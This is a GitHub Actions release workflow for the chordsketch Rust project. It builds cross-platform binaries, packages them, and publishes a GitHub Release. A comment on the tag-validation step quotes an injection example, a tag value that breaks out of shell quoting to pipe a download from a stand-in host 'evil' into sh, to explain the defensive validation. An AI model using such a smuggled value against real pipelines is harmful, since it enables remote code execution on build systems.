name: Release

on:
  push:
    tags:
      - "v*"
  workflow_dispatch:
    inputs:
      tag:
        description: "Tag to build (e.g., v0.1.0)"
        required: true
        type: string

# Tag-triggered releases never receive force-pushes and MUST NOT be
# cancelled mid-flight (the partial-release failure mode described on
# the `build` job below would silently degrade downstream channels).
# Declare a concurrency group so the workflow is still covered by
# `.claude/rules/ci-parallelization.md` §5, but with
# `cancel-in-progress: false` so tag pushes and workflow_dispatch runs
# always run to completion.
concurrency:
  group: release-${{ inputs.tag || github.ref }}
  cancel-in-progress: false

permissions:
  contents: read

env:
  CARGO_TERM_COLOR: always

defaults:
  run:
    shell: bash

jobs:
  build:
    name: Build ${{ matrix.target }}
    runs-on: ${{ matrix.os }}
    # Intentionally fail-closed: if any build matrix cell fails, the
    # downstream `release` job (needs: build) is skipped and no GitHub
    # Release is created. This is correct because release.yml creates
    # the authoritative artifact set that every downstream channel
    # (Docker, VS Code, napi, post-release rollup) keys off. A partial
    # release with one missing archive would silently degrade every
    # install path for that platform; holding the release until all
    # cells pass is the safer failure mode. Contrast with
    # `vscode-extension.yml build-platform`, which ships a universal
    # VSIX so users on a failing platform still get a working extension
    # (see #1795). See #1806.
    strategy:
      fail-fast: false
      matrix:
        include:
          - target: x86_64-unknown-linux-gnu
            os: ubuntu-latest
          - target: aarch64-unknown-linux-gnu
            os: ubuntu-latest
            cross: true
          - target: x86_64-unknown-linux-musl
            os: ubuntu-latest
            cross: true
          - target: aarch64-unknown-linux-musl
            os: ubuntu-latest
            cross: true
          - target: x86_64-apple-darwin
            os: macos-latest
          - target: aarch64-apple-darwin
            os: macos-latest
          - target: x86_64-pc-windows-msvc
            os: windows-latest
    steps:
      - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5 # v4
        with:
          # Pin to the tag under release so `workflow_dispatch` runs
          # build from the tagged commit rather than whichever branch
          # HEAD the user selected as the dispatch ref. `push: tags:`
          # events already resolve GITHUB_SHA to the tagged commit,
          # so this `ref:` is a no-op on that path and a correctness
          # fix for manual re-runs (#2226).
          ref: ${{ inputs.tag || github.ref }}

      - name: Install Rust toolchain
        run: |
          rustup toolchain install stable --profile minimal
          rustup target add ${{ matrix.target }}

      - name: Install cross
        if: matrix.cross
        run: cargo install cross --locked

      # NOTE: no Swatinem/rust-cache here. Per .claude/rules/ci-parallelization.md §2,
      # this workflow fires on version-tag pushes (~every 10 days) and GitHub
      # Actions evicts cache entries after 7 days of inactivity, so the cache
      # expires between runs. Adding rust-cache delivers no wall-clock benefit
      # and only adds YAML noise. Do not add one back without updating the rule.

      - name: Build
        run: |
          if [ "${{ matrix.cross }}" = "true" ]; then
            cross build --release --target ${{ matrix.target }} -p chordsketch -p chordsketch-lsp
          else
            cargo build --release --target ${{ matrix.target }} -p chordsketch -p chordsketch-lsp
          fi
        shell: bash

      - name: Validate release tag
        # Route inputs.tag through env + format regex before any
        # downstream step interpolates the version into a shell body.
        # Without this, a `workflow_dispatch` tag like
        # `v1.0.0"; curl evil | sh; #` would break out of the
        # `echo "version=..."` shell quoting in "Determine version".
        # See #1797.
        uses: ./.github/actions/validate-release-tag
        with:
          tag: ${{ inputs.tag || github.ref_name }}

      - name: Determine version
        id: version
        env:
          EVENT_NAME: ${{ github.event_name }}
          INPUT_TAG: ${{ inputs.tag }}
          REF_NAME: ${{ github.ref_name }}
        run: |
          set -euo pipefail
          if [ "$EVENT_NAME" = "workflow_dispatch" ]; then
            VERSION="$INPUT_TAG"
          else
            VERSION="$REF_NAME"
          fi
          echo "version=$VERSION" >> "$GITHUB_OUTPUT"
        shell: bash

      - name: Package (Unix)
        if: runner.os != 'Windows'
        env:
          VERSION: ${{ steps.version.outputs.version }}
          TARGET: ${{ matrix.target }}
        run: |
          ARCHIVE_NAME="chordsketch-${VERSION}-${TARGET}.tar.gz"
          STAGING="chordsketch-${VERSION}-${TARGET}"
          mkdir "$STAGING"
          cp "target/${TARGET}/release/chordsketch" "$STAGING/"
          cp "target/${TARGET}/release/chordsketch-lsp" "$STAGING/"
          cp LICENSE README.md "$STAGING/"
          tar czf "$ARCHIVE_NAME" "$STAGING"
          echo "ARCHIVE=$ARCHIVE_NAME" >> "$GITHUB_ENV"
        shell: bash

      - name: Package (Windows)
        if: runner.os == 'Windows'
        env:
          VERSION: ${{ steps.version.outputs.version }}
          TARGET: ${{ matrix.target }}
        run: |
          $ArchiveName = "chordsketch-$env:VERSION-$env:TARGET.zip"
          $Staging = "chordsketch-$env:VERSION-$env:TARGET"
          New-Item -ItemType Directory -Path $Staging
          Copy-Item "target/$env:TARGET/release/chordsketch.exe" "$Staging/"
          Copy-Item "target/$env:TARGET/release/chordsketch-lsp.exe" "$Staging/"
          Copy-Item LICENSE, README.md "$Staging/"
          Compress-Archive -Path "$Staging/*" -DestinationPath $ArchiveName
          echo "ARCHIVE=$ArchiveName" >> $env:GITHUB_ENV
        shell: pwsh

      - name: Upload artifact
        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4
        with:
          name: ${{ matrix.target }}
          path: ${{ env.ARCHIVE }}
          retention-days: 7

  release:
    name: Create Release
    needs: build
    runs-on: ubuntu-latest
    permissions:
      contents: write
    if: startsWith(github.ref, 'refs/tags/v') || github.event_name == 'workflow_dispatch'
    steps:
      - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5 # v4

      - name: Download all artifacts
        uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1
        with:
          path: artifacts

      - name: Validate release tag
        # See rationale at the corresponding step in the `build` job.
        uses: ./.github/actions/validate-release-tag
        with:
          tag: ${{ inputs.tag || github.ref_name }}

      - name: Determine version
        id: version
        env:
          EVENT_NAME: ${{ github.event_name }}
          INPUT_TAG: ${{ inputs.tag }}
          REF_NAME: ${{ github.ref_name }}
        run: |
          set -euo pipefail
          if [ "$EVENT_NAME" = "workflow_dispatch" ]; then
            VERSION="$INPUT_TAG"
          else
            VERSION="$REF_NAME"
          fi
          echo "version=$VERSION" >> "$GITHUB_OUTPUT"
        shell: bash

      - name: Generate checksums
        run: |
          cd artifacts
          find . -type f \( -name "*.tar.gz" -o -name "*.zip" \) -exec sha256sum {} \; | sed 's|  \./[^/]*/|  |' > ../checksums.txt
          cat ../checksums.txt

      - name: Assert RELEASE_DISPATCH_TOKEN is present
        # Per ADR-0009: the release MUST be created by a PAT, not
        # GITHUB_TOKEN, so that `release: [published]` cascades to
        # the eight downstream workflows that listen for it. Fail
        # loud if the secret is missing rather than silently
        # falling back to GITHUB_TOKEN (the silent path is exactly
        # what this ADR exists to eliminate).
        env:
          DISPATCH_TOKEN: ${{ secrets.RELEASE_DISPATCH_TOKEN }}
        run: |
          if [ -z "${DISPATCH_TOKEN:-}" ]; then
            echo "::error::RELEASE_DISPATCH_TOKEN is unset. Per ADR-0009 this token is required for releases to cascade to downstream workflows. Provision it via 'gh secret set RELEASE_DISPATCH_TOKEN' before re-running."
            exit 1
          fi

      - name: Create Release
        env:
          # `RELEASE_DISPATCH_TOKEN` is a fine-grained PAT scoped to
          # `Contents: Read and write` on this repo only. Using a
          # non-GITHUB_TOKEN here is what causes the resulting
          # `release: [published]` event to fire downstream
          # workflows. See ADR-0009.
          GH_TOKEN: ${{ secrets.RELEASE_DISPATCH_TOKEN }}
          VERSION: ${{ steps.version.outputs.version }}
        run: |
          gh release create "$VERSION" \
            --title "$VERSION" \
            --notes "See [CHANGELOG.md](https://github.com/koedame/chordsketch/blob/main/CHANGELOG.md) for details." \
            artifacts/*/* \
            checksums.txt \
            --draft=false
